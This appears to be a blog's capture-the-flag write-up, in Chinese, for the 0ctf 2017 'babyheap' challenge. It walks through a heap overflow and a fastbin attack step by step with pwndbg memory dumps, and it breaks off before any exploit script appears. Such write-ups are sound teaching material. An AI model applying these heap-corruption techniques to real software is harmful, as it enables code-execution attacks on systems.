@@ -1,0 +1,402 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>0ctf_2017_babyheap | winter - 像初雪一样自由洒落</title>
+  <meta name="author" content="winter">
+  
+  <meta name="description" content="本文主要列出0ctf_2017_babyheap的详细过程
+主要参考：https://bbs.pediy.com/thread-223461.htm
+
+程序流程
+allocate：申请size大小的块
+fill：对idx的块，设置size，并填入content
+free：释放idx的块
+dump：打">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="0ctf_2017_babyheap"/>
+  <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">winter - 像初雪一样自由洒落</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 0ctf_2017_babyheap</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>本文主要列出0ctf_2017_babyheap的详细过程</p>
+<p>主要参考：<a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p>
+</blockquote>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
+<li>allocate：申请size大小的块</li>
+<li>fill：对idx的块，设置size，并填入content</li>
+<li>free：释放idx的块</li>
+<li>dump：打印idx的块内容</li>
+</ol>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>fill中的size可以重新设置，故可以造成堆溢出。</p>
+<p>方法：fastbin attack</p>
+<ol>
+<li><p>double free泄露libc</p>
+<p>【small/large chunk释放，fd和bk指向main_arena】</p>
+</li>
+<li><p>fastbin attack写malloc_hook为one_gadget</p>
+</li>
+</ol>
+<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec 0ctf_2017_babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;0ctf_2017_babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-申请初始块"><a href="#2-申请初始块" class="headerlink" title="2.申请初始块"></a>2.申请初始块</h4><blockquote>
+<p>四个0x10、一个0x80</p>
+<p>第0个块作用：方便修改第1、2块</p>
+<p>第3个块作用：方便修改0x80的块</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-释放1、2块"><a href="#3-释放1、2块" class="headerlink" title="3.释放1、2块"></a>3.释放1、2块</h4><blockquote>
+<p>为double free做准备，其中 块2指向块1</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#1</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">#指向块1，先进后出</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6020</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6020	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-令释放块2指向块4"><a href="#4-令释放块2指向块4" class="headerlink" title="4.令释放块2指向块4"></a>4.令释放块2指向块4</h4><blockquote>
+<p>通过漏洞fill堆溢出，修改块2里指向块1的低地址，修改为0x80，即可使得块2指向块4</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-为绕过检测，修改块4：0x80-gt-0x10"><a href="#5-为绕过检测，修改块4：0x80-gt-0x10" class="headerlink" title="5.为绕过检测，修改块4：0x80-&gt;0x10"></a>5.为绕过检测，修改块4：0x80-&gt;0x10</h4><blockquote>
+<p>溢出实现</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改成功，但是由于chunk4的大小修改了，故找不到top chunk了，故后期需要把大小：0x10-&gt;0x80</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6080</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过溢出，成功修改了chunk2指向chunk4，导致未释放的chunk4加入到了bin中，重新allocate，导致idx=2、4都为同一个块。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555923ab8040 —▸ 0x555923ab8080 ◂— 0x21 &#x2F;* &#39;!&#39; *&#x2F;</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-重新申请回两个块"><a href="#6-重新申请回两个块" class="headerlink" title="6.重新申请回两个块"></a>6.重新申请回两个块</h4><blockquote>
+<p>1、2、4</p>
+<p>释放：块1-&gt;块2</p>
+<p>修改：块2-&gt;块4</p>
+<p>重新申请：块4-&gt;块2（idx1-&gt;idx2）</p>
+<p>故</p>
+<ul>
+<li>原块1直接释放态-&gt;allocate态</li>
+<li>原块2-&gt;idx1</li>
+<li>原块4-&gt;idx2</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#先进后出</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-重新修改chunk4：0x10-gt-0x80"><a href="#7-重新修改chunk4：0x10-gt-0x80" class="headerlink" title="7.重新修改chunk4：0x10-&gt;0x80"></a>7.重新修改chunk4：0x10-&gt;0x80</h4><blockquote>
+<p>为了让top chunk重新找得到，故需要重新讲chunk4的大小修改回0x80，以便于之后申请操作。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">#0</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line">#1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">#new 1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">#3</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line">#2、4</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-申请一个块，防止块4free与top-chunk合并"><a href="#8-申请一个块，防止块4free与top-chunk合并" class="headerlink" title="8.申请一个块，防止块4free与top chunk合并"></a>8.申请一个块，防止块4free与top chunk合并</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span 